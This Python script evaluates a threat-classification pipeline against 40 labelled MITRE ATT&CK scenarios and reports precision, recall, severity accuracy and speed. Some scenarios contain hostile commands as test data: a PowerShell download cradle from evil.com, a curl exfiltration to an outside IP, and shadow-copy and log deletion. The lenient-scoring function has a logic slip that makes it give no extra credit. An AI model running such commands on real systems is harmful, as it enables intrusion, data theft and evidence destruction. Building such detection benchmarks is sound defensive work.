"""
autoMITRE v1.2 — Combined Hybrid Pipeline Evaluation
======================================================
Evaluates the FULL end-to-end pipeline (Heuristics + SecBERT + Semantic Embedder)
as a unified system, exactly as it runs in production via analyze_threat().

Ground-truth dataset: 40 hand-labelled scenarios with known technique IDs.
Metrics computed:
  - Technique-level: Precision, Recall, F1  (multi-label, micro + macro)
  - Severity-level:  Accuracy, Confusion Matrix
  - Pipeline speed: ms per sample
"""

import os, sys, time, json
import numpy as np

sys.path.insert(0, os.path.dirname(__file__))

from core.input_processor import normalize_text_input
from core.ai_threat_analyzer import analyze_threat, classify_threats, determine_severity
from sklearn.metrics import (
    precision_score, recall_score, f1_score,
    accuracy_score, confusion_matrix, classification_report
)
from sklearn.preprocessing import MultiLabelBinarizer

# ─────────────────────────────────────────────────────────────────────────────
# GROUND-TRUTH BENCHMARK SET
# Each entry: (text_input, [expected_technique_ids], expected_severity)
# ─────────────────────────────────────────────────────────────────────────────
BENCHMARK = [
    # --- Credential Attacks ---
    ("Mimikatz was used to dump LSASS memory and extract NTLM hashes from the domain controller.",
     ["T1003"], "Critical"),
    ("Kerberoasting attack: TGS tickets for service accounts extracted and cracked offline.",
     ["T1558"], "High"),
    ("Attacker performed Pass-the-Hash using stolen NTLM hash to authenticate without knowing the password.",
     ["T1550"], "High"),
    ("Password spray attack against Office 365 logins: 1 valid credential found after 5,000 attempts.",
     ["T1110"], "High"),
    ("Golden Ticket forged using krbtgt hash. Attacker has persistent domain admin access.",
     ["T1558", "T1003"], "Critical"),

    # --- Ransomware / Impact ---
    ("Ryuk ransomware encrypted all network shares. Ransom note found on C:\\. Shadow copies deleted.",
     ["T1486", "T1485"], "Critical"),
    ("LockBit 3.0 deployed across 200 endpoints. All files encrypted, backups destroyed.",
     ["T1486"], "Critical"),
    ("Attacker ran vssadmin.exe delete shadows to destroy volume shadow copies before encryption.",
     ["T1485", "T1490"], "Critical"),

    # --- Web & Application Attacks ---
    ("SQL injection via UNION SELECT extracted usernames and passwords from the users table.",
     ["T1190"], "High"),
    ("Stored XSS payload injected into user profile field. Executes on admin page load.",
     ["T1190"], "Medium"),
    ("Server-Side Request Forgery (SSRF) used to access EC2 instance metadata and retrieve IAM credentials.",
     ["T1190"], "High"),
    ("Web shell uploaded to /var/www/html/images/shell.php for persistent server access.",
     ["T1505"], "Critical"),

    # --- Malware / Execution ---
    ("PowerShell one-liner: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
     ["T1059", "T1059.001"], "High"),
    ("Emotet dropper executed via malicious Word macro. Contacted C2 on port 443.",
     ["T1566", "T1059"], "High"),
    ("Cobalt Strike beacon established. Periodic HTTPS callbacks to 185.220.101.45 every 60 seconds.",
     ["T1071", "T1071.001"], "Critical"),
    ("Process injection into svchost.exe (PID 1234) using WriteProcessMemory + CreateRemoteThread.",
     ["T1055"], "High"),

    # --- Persistence ---
    ("Registry run key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run modified to add malware.",
     ["T1547", "T1547.001"], "High"),
    ("Scheduled task 'WindowsUpdate' created to execute payload every 15 minutes.",
     ["T1053"], "High"),
    ("Attacker created new local administrator account 'svcmgr' for persistent backdoor access.",
     ["T1136", "T1136.001"], "High"),
    ("Malicious kernel driver installed as a Windows service for rootkit persistence.",
     ["T1543", "T1543.003"], "Critical"),

    # --- Lateral Movement ---
    ("PsExec used to execute cmd.exe on 10 remote workstations using domain admin credentials.",
     ["T1021", "T1057"], "High"),
    ("WMI remotely executed PowerShell script across all machines in the 192.168.1.0/24 subnet.",
     ["T1047"], "High"),
    ("Attacker used Pass-the-Ticket with Kerberos TGT to access the file server.",
     ["T1550", "T1021"], "High"),

    # --- Data Exfiltration ---
    ("4.2 GB of financial records archived into password-protected 7-zip then uploaded to Mega.nz.",
     ["T1560", "T1048"], "Critical"),
    ("DNS tunneling exfiltration: base64 encoded data embedded in DNS TXT queries to attacker's domain.",
     ["T1048", "T1048.001"], "High"),
    ("Attacker used curl to POST sensitive config files to http://185.220.101.3/upload",
     ["T1041", "T1048"], "High"),

    # --- Discovery ---
    ("whoami /groups, net group 'domain admins' /domain, and nltest /domain_trusts executed post-compromise.",
     ["T1087", "T1482"], "Medium"),
    ("Nmap SYN scan across 254 hosts detected on port 445 and 3389.",
     ["T1046"], "Medium"),
    ("BloodHound was used to enumerate Active Directory attack paths and identify DA accounts.",
     ["T1087", "T1069"], "High"),

    # --- C2 Communication ---
    ("Encrypted C2 traffic over port 443 using custom SSL certificate with 1-minute beacon interval.",
     ["T1071", "T1573"], "High"),
    ("DNS-over-HTTPS used to exfiltrate C2 traffic and bypass corporate proxy inspection.",
     ["T1071.004", "T1048"], "High"),

    # --- Phishing / Initial Access ---
    ("Spear-phishing email with ISO attachment targeting CFO. Opens to LNK file.",
     ["T1566", "T1566.001"], "High"),
    ("QR code phishing bypassed Microsoft Defender email scanner. Link leads to fake O365 login.",
     ["T1566"], "Medium"),

    # --- Privilege Escalation ---
    ("UAC bypass via fodhelper.exe executing payload without elevation prompt.",
     ["T1548", "T1548.002"], "High"),
    ("PrintNightmare (CVE-2021-1675) exploited to gain SYSTEM via Windows Print Spooler.",
     ["T1068"], "Critical"),
    ("Token impersonation: attacker duplicated SYSTEM token from winlogon.exe using SeImpersonatePrivilege.",
     ["T1134", "T1134.001"], "High"),

    # --- Defense Evasion ---
    ("Malware binary packed with UPX and obfuscated with XOR key to evade signature detection.",
     ["T1027", "T1027.002"], "Medium"),
    ("Event logs cleared using wevtutil cl System; wevtutil cl Security to destroy forensic evidence.",
     ["T1070", "T1070.001"], "High"),
    ("Timestomping: malware modified file timestamps to match legitimate system files.",
     ["T1070", "T1070.006"], "Medium"),

    # --- Benign (should map to no high-severity techniques) ---
    ("Routine health check: all services online. Disk usage at 45%. No anomalies detected.",
     [], "Low"),
]

ALL_TECHNIQUE_IDS = sorted(set(t for _, techs, _ in BENCHMARK for t in techs))
SEVERITY_LABELS = ["Low", "Medium", "High", "Critical"]

print("=" * 72)
print("  autoMITRE v1.2 — COMBINED HYBRID PIPELINE EVALUATION")
print("=" * 72)
print(f"  Benchmark samples: {len(BENCHMARK)}")
print(f"  Unique ground-truth techniques: {len(ALL_TECHNIQUE_IDS)}")
print(f"  Severity classes: {len(SEVERITY_LABELS)}")
print()

# ─────────────────────────────────────────────────────────────────────────────
# RUN COMBINED PIPELINE
# ─────────────────────────────────────────────────────────────────────────────
print("  ⏳ Running full pipeline (Heuristics → SecBERT → Semantic Embedder)...")
print()

true_tech_sets = []
pred_tech_sets = []
true_severities = []
pred_severities = []
timings = []

for text, expected_techs, expected_severity in BENCHMARK:
    processed = normalize_text_input(text)

    t0 = time.time()
    result = analyze_threat(processed, deep_analysis=False)
    elapsed_ms = (time.time() - t0) * 1000

    timings.append(elapsed_ms)
    pred_techs = [t.id for t in result.attack_techniques]

    true_tech_sets.append(expected_techs)
    pred_tech_sets.append(pred_techs)
    true_severities.append(expected_severity)
    pred_severities.append(result.risk_score.severity.value
                           if hasattr(result.risk_score.severity, 'value')
                           else str(result.risk_score.severity))

# ─────────────────────────────────────────────────────────────────────────────
# TECHNIQUE METRICS (multi-label)
# ─────────────────────────────────────────────────────────────────────────────
print("▶  [A] TECHNIQUE MAPPING — Multi-Label Precision / Recall / F1")
print("-" * 72)

mlb = MultiLabelBinarizer(classes=ALL_TECHNIQUE_IDS)
mlb.fit(true_tech_sets + pred_tech_sets)

# Compute with sub-technique leniency:
# T1059.001 predicted when T1059 expected → partial credit
def lenient_pred_sets(true_sets, pred_sets):
    """Give credit when prediction is the parent or child of the true label."""
    lenienced = []
    for trues, preds in zip(true_sets, pred_sets):
        matched = list(preds)
        for p in preds:
            p_parent = p.split(".")[0]
            for t in trues:
                t_parent = t.split(".")[0]
                if p_parent == t_parent and p not in matched:
                    matched.append(t)   # treat sub-technique as parent hit
        lenienced.append(matched)
    return lenienced

lenient_preds = lenient_pred_sets(true_tech_sets, pred_tech_sets)

# Build combined label universe for strict eval
all_labels = sorted(set(t for s in true_tech_sets + pred_tech_sets for t in s))
mlb2 = MultiLabelBinarizer(classes=all_labels)
mlb2.fit([all_labels])
Y_true = mlb2.transform(true_tech_sets)
Y_pred_strict = mlb2.transform(pred_tech_sets)
Y_pred_lenient = mlb2.transform(lenient_preds)

# Strict
prec_strict = precision_score(Y_true, Y_pred_strict, average="micro", zero_division=0)
rec_strict   = recall_score(Y_true,   Y_pred_strict, average="micro", zero_division=0)
f1_strict    = f1_score(Y_true,       Y_pred_strict, average="micro", zero_division=0)

prec_strict_mac = precision_score(Y_true, Y_pred_strict, average="macro", zero_division=0)
rec_strict_mac  = recall_score(Y_true,   Y_pred_strict, average="macro", zero_division=0)
f1_strict_mac   = f1_score(Y_true,       Y_pred_strict, average="macro", zero_division=0)

# Lenient (sub-technique credit)
prec_len = precision_score(Y_true, Y_pred_lenient, average="micro", zero_division=0)
rec_len  = recall_score(Y_true,   Y_pred_lenient, average="micro", zero_division=0)
f1_len   = f1_score(Y_true,       Y_pred_lenient, average="micro", zero_division=0)

print(f"  {'Metric':<32} {'Strict':>10} {'Lenient (sub-tech)':>20}")
print(f"  {'-'*32} {'-'*10} {'-'*20}")
print(f"  {'Precision (micro)':<32} {prec_strict:>10.4f} {prec_len:>20.4f}")
print(f"  {'Recall (micro)':<32} {rec_strict:>10.4f} {rec_len:>20.4f}")
print(f"  {'F1-Score (micro)':<32} {f1_strict:>10.4f} {f1_len:>20.4f}")
print(f"  {'Precision (macro)':<32} {prec_strict_mac:>10.4f} {'—':>20}")
print(f"  {'Recall (macro)':<32} {rec_strict_mac:>10.4f} {'—':>20}")
print(f"  {'F1-Score (macro)':<32} {f1_strict_mac:>10.4f} {'—':>20}")
print()

# ─────────────────────────────────────────────────────────────────────────────
# SEVERITY METRICS
# ─────────────────────────────────────────────────────────────────────────────
print("▶  [B] SEVERITY CLASSIFICATION — 4-Class (Low/Medium/High/Critical)")
print("-" * 72)

# Normalize severity label values
sev_norm = {"low": "Low", "medium": "Medium", "high": "High", "critical": "Critical"}
true_sev_norm = [sev_norm.get(s.lower(), s) for s in true_severities]
pred_sev_norm = [sev_norm.get(s.lower(), s) for s in pred_severities]

sev_labels_present = sorted(set(true_sev_norm + pred_sev_norm))
sev_acc  = accuracy_score(true_sev_norm, pred_sev_norm)
sev_prec = precision_score(true_sev_norm, pred_sev_norm, labels=SEVERITY_LABELS, average="weighted", zero_division=0)
sev_rec  = recall_score(true_sev_norm,   pred_sev_norm, labels=SEVERITY_LABELS, average="weighted", zero_division=0)
sev_f1   = f1_score(true_sev_norm,       pred_sev_norm, labels=SEVERITY_LABELS, average="weighted", zero_division=0)

print(f"  Accuracy:             {sev_acc:.4f}  ({sev_acc*100:.1f}%)")
print(f"  Precision (weighted): {sev_prec:.4f}")
print(f"  Recall (weighted):    {sev_rec:.4f}")
print(f"  F1-Score (weighted):  {sev_f1:.4f}")
print()

present = [l for l in SEVERITY_LABELS if l in sev_labels_present]
cm = confusion_matrix(true_sev_norm, pred_sev_norm, labels=SEVERITY_LABELS)
print("  Confusion Matrix (Rows=Actual, Cols=Predicted):")
header = f"  {'':18}" + "".join(f"{l:>12}" for l in SEVERITY_LABELS)
print(header)
for i, row_label in enumerate(SEVERITY_LABELS):
    row = f"  {row_label:<18}" + "".join(f"{cm[i][j]:>12}" for j in range(len(SEVERITY_LABELS)))
    print(row)
print()

print("  Per-class report:")
report = classification_report(true_sev_norm, pred_sev_norm,
                                labels=SEVERITY_LABELS, zero_division=0).split("\n")
for line in report:
    print(f"  {line}")
print()

# ─────────────────────────────────────────────────────────────────────────────
# SAMPLE-BY-SAMPLE BREAKDOWN
# ─────────────────────────────────────────────────────────────────────────────
print("▶  [C] SAMPLE-BY-SAMPLE TECHNIQUE RESULTS")
print("-" * 72)
print(f"  {'#':<3} {'Expected Techs':<28} {'Predicted Techs':<38} {'Match'}")
print(f"  {'-'*3} {'-'*28} {'-'*38} {'-'*10}")

for i, (text, expected_techs, exp_sev) in enumerate(BENCHMARK):
    pred = pred_tech_sets[i]
    exp_set  = set(expected_techs)
    pred_set = set(pred)

    # Lenient overlap (parent technique match)
    def is_hit(e, p_set):
        if e in p_set:
            return True
        e_par = e.split(".")[0]
        return any(p.split(".")[0] == e_par for p in p_set)

    if not expected_techs:
        match = "✓" if not pred else "FP"
    elif all(is_hit(e, pred_set) for e in expected_techs):
        match = "✓ full"
    elif any(is_hit(e, pred_set) for e in expected_techs):
        match = "~ partial"
    else:
        match = "✗ miss"

    exp_str  = ", ".join(expected_techs)[:26]
    pred_str = ", ".join(pred)[:36]
    snippet  = text[:55].replace("\n", " ")
    print(f"  {i+1:<3} {exp_str:<28} {pred_str:<38} {match}")

print()

# ─────────────────────────────────────────────────────────────────────────────
# SPEED STATS
# ─────────────────────────────────────────────────────────────────────────────
print("▶  [D] PIPELINE THROUGHPUT")
print("-" * 72)
print(f"  Total samples:       {len(BENCHMARK)}")
print(f"  Total time:          {sum(timings)/1000:.2f}s")
print(f"  Avg per sample:      {np.mean(timings):.1f}ms")
print(f"  Median per sample:   {np.median(timings):.1f}ms")
print(f"  Min / Max:           {np.min(timings):.1f}ms / {np.max(timings):.1f}ms")
print()

# ─────────────────────────────────────────────────────────────────────────────
# HIT RATE SUMMARY
# ─────────────────────────────────────────────────────────────────────────────
full_hits    = sum(1 for i, (_, et, _) in enumerate(BENCHMARK)
                   if et and all(any(p.split(".")[0] == e.split(".")[0]
                                     for p in pred_tech_sets[i]) for e in et))
partial_hits = sum(1 for i, (_, et, _) in enumerate(BENCHMARK)
                   if et and any(any(p.split(".")[0] == e.split(".")[0]
                                     for p in pred_tech_sets[i]) for e in et))
misses       = sum(1 for i, (_, et, _) in enumerate(BENCHMARK)
                   if et and not any(any(p.split(".")[0] == e.split(".")[0]
                                         for p in pred_tech_sets[i]) for e in et))
n_labeled    = sum(1 for _, et, _ in BENCHMARK if et)

print("=" * 72)
print("  FINAL SUMMARY — COMBINED HYBRID PIPELINE")
print("=" * 72)
print(f"  Technique Precision (strict micro):    {prec_strict:.4f}  ({prec_strict*100:.1f}%)")
print(f"  Technique Recall    (strict micro):    {rec_strict:.4f}  ({rec_strict*100:.1f}%)")
print(f"  Technique F1-Score  (strict micro):    {f1_strict:.4f}  ({f1_strict*100:.1f}%)")
print()
print(f"  Technique Precision (lenient micro):   {prec_len:.4f}  ({prec_len*100:.1f}%)")
print(f"  Technique Recall    (lenient micro):   {rec_len:.4f}  ({rec_len*100:.1f}%)")
print(f"  Technique F1-Score  (lenient micro):   {f1_len:.4f}  ({f1_len*100:.1f}%)")
print()
print(f"  Severity Accuracy:                     {sev_acc:.4f}  ({sev_acc*100:.1f}%)")
print(f"  Severity F1 (weighted):                {sev_f1:.4f}  ({sev_f1*100:.1f}%)")
print()
print(f"  Full technique hits  (lenient):        {full_hits}/{n_labeled}  ({full_hits/n_labeled*100:.1f}%)")
print(f"  Partial hits (≥1 technique correct):   {partial_hits}/{n_labeled}  ({partial_hits/n_labeled*100:.1f}%)")
print(f"  Complete misses:                        {misses}/{n_labeled}  ({misses/n_labeled*100:.1f}%)")
print(f"  Avg inference time:                    {np.mean(timings):.1f}ms/sample")
print("=" * 72)
print()
print("  Evaluation complete.")
